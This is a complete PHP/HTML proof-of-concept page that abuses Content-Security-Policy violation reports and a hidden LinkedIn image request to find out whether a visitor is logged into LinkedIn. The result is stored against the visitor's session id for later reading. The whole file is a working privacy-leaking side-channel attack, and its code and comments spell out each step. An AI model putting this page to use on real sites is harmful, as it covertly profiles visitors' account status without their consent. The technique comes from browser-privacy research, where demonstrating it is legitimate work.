<?php
	session_start();
	$id = session_id();

	// apc is php's native cross-process cache 
	// (we can read it's values in a request to status.php)
	apc_store($id."","not-logged-in");
	
	// 1. Allow images request only to https://fr.linkedin.com
	// 2. Report any other request to our report-uri and send the user's session id  
	header("Content-Security-Policy: img-src https://fr.linkedin.com; report-uri /report-uri.php?id=".$id);
?>
<!DOCTYPE html>
<html>
<head>
	<title>CSP Redirect Detection</title>
	<style>
		html{
			background: #efefef;
		}
		img{
			opacity: 0;
		}
	</style>
</head>
<body>
<script>
	function done(){
		setTimeout(function(){	// wait until request to report-uri is sent
			window.location = '/status.php';
		}, 200);
	}
</script>
<!-- Make a request to an url that redirects to https://www.linkedin.com only if the user is logged in -->
<img src="https://fr.linkedin.com" onerror="done()">

<!-- "If NoScript": redirect after 5s  -->
<meta http-equiv="refresh" content="5;URL='/status.php'" />	
</body>
</html>
